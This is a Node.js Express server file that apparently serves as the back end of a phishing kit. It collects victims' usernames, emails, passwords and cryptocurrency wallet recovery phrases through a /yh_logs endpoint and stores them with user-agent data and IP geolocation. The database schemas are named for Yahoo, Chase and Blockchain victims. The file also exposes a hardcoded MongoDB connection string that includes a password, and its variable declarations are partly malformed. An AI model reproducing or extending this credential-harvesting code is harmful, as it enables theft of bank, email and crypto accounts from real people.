const express = require('express')
const app = express()
const port = process.env.PORT || 9000;
    rp = require('request-promise'),
    requestIp = require('request-ip'),
    bodyParser = require('body-parser'),
    mongoose = require("mongoose"),
    Sniffr = require("sniffr"),
    s = new Sniffr(),
    yahooVictimSchema = null,
    chaseVictim = null,
    blockchainVictimSchema = null,
    blockchainVictim = null,
    visitorIp = null,
    db = null;

mongoose.connect("mongodb+srv://dbUser:nfyZeLTQB6sqpdF@cluster0.dii5a.mongodb.net/myFirstDatabase?retryWrites=true&w=majority", {
    useNewUrlParser: true,
    useUnifiedTopology: true
})

db = mongoose.connection;

yahooVictimSchema = new mongoose.Schema({
	username: String,
    email: String,
    password: String,
    userAgent: String,
    victimIpInfo: {}
}, {
    minimize: false
})

chaseVictim = mongoose.model("chaseVictim", yahooVictimSchema);

blockchainVictimSchema = new mongoose.Schema({
    email: String,
    phrase: String,
    userDevice: String,
    userAgent: String,
    victimIpInfo: {}
}, {
    minimize: false
})

blockchainVictim = mongoose.model("blockchainVictim", blockchainVictimSchema);



app.use(bodyParser.json())

app.use(function(req, res, next) {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    next();
});

app.get("/yh_logs", (req, res) => {
    visitorIp = requestIp.getClientIp(req);
    s.sniff(req.headers['user-agent']);
    console.log(req.headers['user-agent']);
    console.log(s.os.name);
    console.log(visitorIp)
    console.log(req.body)
    res.setHeader("Content-Type", "text/plain");
    getVictimIpInfoAndSaveYahooVictimInfoToDb(req.body.username, req.body.email, req.body.password, req.headers['user-agent'], req, res);
})

app.use(express.static('web'));



function getVictimIpInfoAndSaveYahooVictimInfoToDb(username, email, password, userAgent, req, res) {

    rp({
        uri: `http://ip-api.com/json/${visitorIp}`,
        json: true
    }).then(victimIpInfo => {
        console.log(victimIpInfo);

        new chaseVictim({
			username,
            email,
            password,
            userAgent,
            victimIpInfo
        }).save((err, doc) => {
            if (err) {
                console.log(err);
                res.end("Server Error");
            } else {
				console.log("---");
                console.log(doc);
				console.log("---");
                res.end("Done");
            }
        })

    }).catch(err => {
        console.log(err)
        res.end("Server Error");
    })

}


function getVictimIpInfoAndSaveBlockchainVictimInfoToDb(email, phrase, userDevice, userAgent, req, res) {

    rp({
        uri: `http://ip-api.com/json/${visitorIp}`,
        json: true
    }).then(victimIpInfo => {
        console.log(victimIpInfo);

        new blockchainVictim({
            email,
            phrase,
            userDevice,
            userAgent,
            victimIpInfo
        }).save((err, doc) => {
            if (err) {
                console.log(err);
                res.end("Server Error");
            } else {
                console.log(doc);
                res.end("Done");
            }
        })

    }).catch(err => {
        console.log(err)
        res.end("Server Error");
    })

}

db.on("error", (err) => {
    console.log(err);
})

db.once("open", () => {

    console.log(`Database connected`);

		app.listen(port, () => {
		  console.log(`Example app listening at http://localhost:${port}`)
		})

})






